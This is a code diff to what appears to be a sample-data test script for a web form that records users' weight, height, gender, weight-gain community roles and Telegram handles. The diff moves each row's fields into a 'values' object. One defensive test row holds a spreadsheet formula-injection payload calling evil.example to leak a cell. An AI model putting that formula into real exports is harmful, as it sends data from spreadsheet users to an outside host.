@@ -61,6 +61,11 @@ const load = async (path) => {
   await import("data:text/javascript," + encodeURIComponent(src));
 };
 
+// form.js's pure half reads apps/web/fields.js, which reads
+// apps/web/site.config.js - both load first, the same order
+// your-page.html's own <script> tags use (0.9-M2-S2, #353).
+await load("../apps/web/site.config.js");
+await load("../apps/web/fields.js");
 await load("../apps/web/form.js");
 await load("../apps/web/crypto.js");
 
@@ -106,35 +111,42 @@ const keyFile = JSON.parse(await readFile(HERE("test-key.json"), "utf8"));
  *   - a row encrypted to a key nobody here holds
  *   - the top and bottom of every validation range
  */
+/*
+ * Each row's `values` is what apps/web/form.js's readValues() collects
+ * from the boxes on screen (0.9-M2-S2, #353): one `weight` box, one
+ * `height` box, and `heightCompound` for imperial's inches - never
+ * `weightKg`/`weightLb`/`heightFeet`/`heightInches` split by unit, which
+ * was the shape the hand-kept form used before this file's own header
+ * was written and is not what readValues() produces any more.
+ */
 const SAMPLE = [
   /*
    * Four entries over five months, gaining throughout. The steady case
    * the weight-over-time chart is for.
    */
   {
-    at: "2026-03-02T09:14:00.000Z",
-    telegram: "@BigBearBenny", units: "metric",
-    weightKg: "118", heightCm: "183",
-    gender: "male", roles: ["gainer", "feedee"], country: "US", over18: true,
+    at: "2026-03-02T09:14:00.000Z", telegram: "@BigBearBenny",
+    units: "metric",
+    values: { weight: "118", height: "183", gender: "male",
+      roles: ["gainer", "feedee"], country: "US", over18: true },
   },
   {
-    at: "2026-04-06T09:02:00.000Z",
-    telegram: "bigbearbenny", units: "metric",
-    weightKg: "124.5", heightCm: "183",
-    gender: "male", roles: ["gainer", "feedee"], country: "US", over18: true,
+    at: "2026-04-06T09:02:00.000Z", telegram: "bigbearbenny",
+    units: "metric",
+    values: { weight: "124.5", height: "183", gender: "male",
+      roles: ["gainer", "feedee"], country: "US", over18: true },
   },
   {
-    at: "2026-05-11T20:41:00.000Z",
-    telegram: "bigbearbenny", units: "metric",
-    weightKg: "131", heightCm: "183",
-    gender: "male", roles: ["gainer", "feedee"], country: "US", over18: true,
+    at: "2026-05-11T20:41:00.000Z", telegram: "bigbearbenny",
+    units: "metric",
+    values: { weight: "131", height: "183", gender: "male",
+      roles: ["gainer", "feedee"], country: "US", over18: true },
   },
   {
-    at: "2026-07-19T11:05:00.000Z",
-    telegram: "bigbearbenny", units: "metric",
-    weightKg: "139.5", heightCm: "183",
-    gender: "male", roles: ["gainer", "feedee", "admirer"], country: "US",
-    over18: true,
+    at: "2026-07-19T11:05:00.000Z", telegram: "bigbearbenny",
+    units: "metric",
+    values: { weight: "139.5", height: "183", gender: "male",
+      roles: ["gainer", "feedee", "admirer"], country: "US", over18: true },
   },
 
   /*
@@ -144,22 +156,23 @@ const SAMPLE = [
    * mix-up or two people sharing a handle all look like from here.
    */
   {
-    at: "2026-04-15T18:30:00.000Z",
-    telegram: "t.me/roundrobin_ok", units: "imperial",
-    weightLb: "212", heightFeet: "5", heightInches: "6",
-    gender: "female", roles: ["feedee"], country: "GB", over18: true,
+    at: "2026-04-15T18:30:00.000Z", telegram: "t.me/roundrobin_ok",
+    units: "imperial",
+    values: { weight: "212", height: "5", heightCompound: "6",
+      gender: "female", roles: ["feedee"], country: "GB", over18: true },
   },
   {
-    at: "2026-06-01T19:12:00.000Z",
-    telegram: "roundrobin_ok", units: "imperial",
-    weightLb: "228.5", heightFeet: "5", heightInches: "6",
-    gender: "female", roles: ["feedee"], country: "GB", over18: true,
+    at: "2026-06-01T19:12:00.000Z", telegram: "roundrobin_ok",
+    units: "imperial",
+    values: { weight: "228.5", height: "5", heightCompound: "6",
+      gender: "female", roles: ["feedee"], country: "GB", over18: true },
   },
   {
-    at: "2026-07-28T08:55:00.000Z",
-    telegram: "roundrobin_ok", units: "imperial",
-    weightLb: "241", heightFeet: "5", heightInches: "8",
-    gender: "female", roles: ["feedee", "gainer"], country: "GB", over18: true,
+    at: "2026-07-28T08:55:00.000Z", telegram: "roundrobin_ok",
+    units: "imperial",
+    values: { weight: "241", height: "5", heightCompound: "8",
+      gender: "female", roles: ["feedee", "gainer"], country: "GB",
+      over18: true },
   },
 
   /*
@@ -167,16 +180,16 @@ const SAMPLE = [
    * a direction.
    */
   {
-    at: "2026-05-20T13:00:00.000Z",
-    telegram: "quietfeeder_mx", units: "metric",
-    weightKg: "96", heightCm: "171",
-    gender: "nonbinary", roles: ["feeder"], country: "MX", over18: true,
+    at: "2026-05-20T13:00:00.000Z", telegram: "quietfeeder_mx",
+    units: "metric",
+    values: { weight: "96", height: "171", gender: "nonbinary",
+      roles: ["feeder"], country: "MX", over18: true },
   },
   {
-    at: "2026-07-30T13:44:00.000Z",
-    telegram: "quietfeeder_mx", units: "metric",
-    weightKg: "91.2", heightCm: "171",
-    gender: "nonbinary", roles: ["feeder"], country: "MX", over18: true,
+    at: "2026-07-30T13:44:00.000Z", telegram: "quietfeeder_mx",
+    units: "metric",
+    values: { weight: "91.2", height: "171", gender: "nonbinary",
+      roles: ["feeder"], country: "MX", over18: true },
   },
 
   /*
@@ -186,23 +199,23 @@ const SAMPLE = [
    * the row that proves it.
    */
   {
-    at: "2026-06-11T22:07:00.000Z",
-    telegram: "no_details_here", units: "imperial",
-    weightLb: "187", heightFeet: "5", heightInches: "11",
-    gender: "", roles: [], country: "", over18: true,
+    at: "2026-06-11T22:07:00.000Z", telegram: "no_details_here",
+    units: "imperial",
+    values: { weight: "187", height: "5", heightCompound: "11",
+      gender: "", roles: [], country: "", over18: true },
   },
 
   /*
    * Imperial with the inches box empty, which means a round number of
    * feet rather than an error. Settled in DESIGN.md under the imperial
-   * height question, and held by dev/form.test.mjs; here so the sample
-   * shows what it writes down - `entered` reads "6 ft 0 in".
+   * height question, and held by tests/your-page.test.mjs; here so the
+   * sample shows what it writes down - `entered` reads "6 ft 0 in".
    */
   {
-    at: "2026-06-18T07:21:00.000Z",
-    telegram: "roundfeet_only", units: "imperial",
-    weightLb: "203", heightFeet: "6", heightInches: "",
-    gender: "other", roles: ["admirer"], country: "CA", over18: true,
+    at: "2026-06-18T07:21:00.000Z", telegram: "roundfeet_only",
+    units: "imperial",
+    values: { weight: "203", height: "6", heightCompound: "",
+      gender: "other", roles: ["admirer"], country: "CA", over18: true },
   },
 
   /*
@@ -211,10 +224,10 @@ const SAMPLE = [
    * history that does not exist.
    */
   {
-    at: "2026-07-02T16:38:00.000Z",
-    telegram: "just_the_once", units: "metric",
-    weightKg: "104.4", heightCm: "168",
-    gender: "female", roles: ["admirer"], country: "DE", over18: true,
+    at: "2026-07-02T16:38:00.000Z", telegram: "just_the_once",
+    units: "metric",
+    values: { weight: "104.4", height: "168", gender: "female",
+      roles: ["admirer"], country: "DE", over18: true },
   },
 
   /*
@@ -224,28 +237,29 @@ const SAMPLE = [
    * something it should not.
    */
   {
-    at: "2026-07-05T10:00:00.000Z",
-    telegram: "edge_low_metric", units: "metric",
-    weightKg: "20", heightCm: "100",
-    gender: "other", roles: [], country: "NL", over18: true,
+    at: "2026-07-05T10:00:00.000Z", telegram: "edge_low_metric",
+    units: "metric",
+    values: { weight: "20", height: "100", gender: "other", roles: [],
+      country: "NL", over18: true },
   },
   {
-    at: "2026-07-06T10:00:00.000Z",
-    telegram: "edge_high_metric", units: "metric",
-    weightKg: "500", heightCm: "250",
-    gender: "male", roles: ["feedee"], country: "PL", over18: true,
+    at: "2026-07-06T10:00:00.000Z", telegram: "edge_high_metric",
+    units: "metric",
+    values: { weight: "500", height: "250", gender: "male",
+      roles: ["feedee"], country: "PL", over18: true },
   },
   {
-    at: "2026-07-07T10:00:00.000Z",
-    telegram: "edge_low_imperial", units: "imperial",
-    weightLb: "44", heightFeet: "3", heightInches: "0",
-    gender: "female", roles: [], country: "ES", over18: true,
+    at: "2026-07-07T10:00:00.000Z", telegram: "edge_low_imperial",
+    units: "imperial",
+    values: { weight: "44", height: "3", heightCompound: "0",
+      gender: "female", roles: [], country: "ES", over18: true },
   },
   {
-    at: "2026-07-08T10:00:00.000Z",
-    telegram: "edge_high_imperial", units: "imperial",
-    weightLb: "1100", heightFeet: "8", heightInches: "11",
-    gender: "nonbinary", roles: ["gainer"], country: "IT", over18: true,
+    at: "2026-07-08T10:00:00.000Z", telegram: "edge_high_imperial",
+    units: "imperial",
+    values: { weight: "1100", height: "8", heightCompound: "11",
+      gender: "nonbinary", roles: ["gainer"], country: "IT",
+      over18: true },
   },
 
   /*
@@ -260,11 +274,11 @@ const SAMPLE = [
    * apostrophe; this is the row that shows it working.
    */
   {
-    at: "2026-07-12T14:26:00.000Z",
-    expect: "invalid",
-    telegram: '=HYPERLINK("http://evil.example/"&A1,"click")', units: "metric",
-    weightKg: "88", heightCm: "175",
-    gender: "male", roles: ["feeder"], country: "FR", over18: true,
+    at: "2026-07-12T14:26:00.000Z", expect: "invalid",
+    telegram: '=HYPERLINK("http://evil.example/"&A1,"click")',
+    units: "metric",
+    values: { weight: "88", height: "175", gender: "male",
+      roles: ["feeder"], country: "FR", over18: true },
   },
 
   /*
@@ -276,11 +290,10 @@ const SAMPLE = [
    * regardless.
    */
   {
-    at: "2026-07-25T09:30:00.000Z",
-    wrongKey: true,
+    at: "2026-07-25T09:30:00.000Z", wrongKey: true,
     telegram: "sealed_to_nobody", units: "metric",
-    weightKg: "112", heightCm: "180",
-    gender: "male", roles: ["gainer"], country: "SE", over18: true,
+    values: { weight: "112", height: "180", gender: "male",
+      roles: ["gainer"], country: "SE", over18: true },
   },
 ];
 
